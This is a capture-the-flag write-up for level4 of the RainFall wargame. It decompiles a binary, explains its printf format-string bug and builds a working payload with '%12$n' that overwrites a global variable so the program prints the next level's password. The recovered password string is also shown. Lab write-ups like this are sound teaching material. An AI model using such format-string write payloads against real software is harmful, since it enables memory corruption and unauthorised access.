## Step 1: Static & Dynamic Analysis

```c
int32_t p(char* arg1)
{
    return printf(arg1);
}

uint32_t n()
{
    void buf;
    fgets(&buf, 512, __bss_start);
    p(&buf);
    uint32_t m = m;
    
    if (m != 0x1025544)
        return m;
    
    return system("/bin/cat /home/user/level5/.pass");
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    return n();
}
```

### Explanation

The binary fills a `buffer` (`buf`) via `stdin` using `fgets()` and will print the password if the value `m` is equal to `0x1025544` (`16930116`).  
The function `p()` calls `printf()` and simply prints `buf`, making the binary vulnerable to a `format string attack`.  
Our goal is to overwrite the value of `m` to pass the check and print the password.

To overwrite `m`, we will find its address and determine its position on the stack relative to `printf()` arguments.

```asm
(gdb) info var
    0x08049810  m
``` 

Now, to find its position, we print stack addresses using the `%p` format specifier.

```python
level4@RainFall:~$ python -c "print('\x42\x42\x42\x42' + '%p ' * 15)" | ./level4 
BBBB
0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x42424242 0x25207025 0x70252070 0x20702520
```

We notice that `0x42424242` is the 12th argument on the stack.

Now, we are going to use the `$n` `printf()` format. It is used to write the number of printed characters combined with `%12`, which allows us to specify an address where the value will be written.

Concretely, our payload will first contain the address of `m`, followed by `16930112` random characters, and then `%12$n`, which writes the total number of printed characters (`4` + `16930112`, equivalent to `0x1025544` in hexa) to the 12th argument on the stack (`0x08049810`).

## Step 2: Exploiting the Binary

```bash
level3@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")' | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
